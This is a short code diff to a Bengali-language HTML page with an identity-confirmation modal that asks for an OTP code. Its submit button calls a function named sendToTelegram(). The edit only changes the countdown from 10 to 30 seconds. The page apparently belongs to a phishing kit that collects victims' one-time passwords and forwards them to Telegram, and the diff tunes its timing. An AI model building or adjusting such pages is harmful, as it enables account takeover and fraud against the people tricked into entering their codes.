@@ -154,7 +154,7 @@
   <div class="modal" id="otpModal">
     <div class="modal-content">
       <h2>আপনার পরিচয় নিশ্চিত করুন</h2>
-      <p class="countdown" id="countdown">OTP পাঠানো হচ্ছে... 10 সেকেন্ড অপেক্ষা করুন</p>
+      <p class="countdown" id="countdown">OTP পাঠানো হচ্ছে... 30 সেকেন্ড অপেক্ষা করুন</p>
       <input type="text" id="otp" placeholder="OTP কোড দিন" disabled>
       <button onclick="sendToTelegram()">সাবমিট করুন</button>
     </div>
@@ -166,7 +166,7 @@
 
     function showModal() {
       document.getElementById("otpModal").style.display = "flex";
-      let countdown = 10;
+      let countdown = 30;
       const countdownEl = document.getElementById("countdown");
       const otpInput = document.getElementById("otp");
       otpInput.disabled = true;
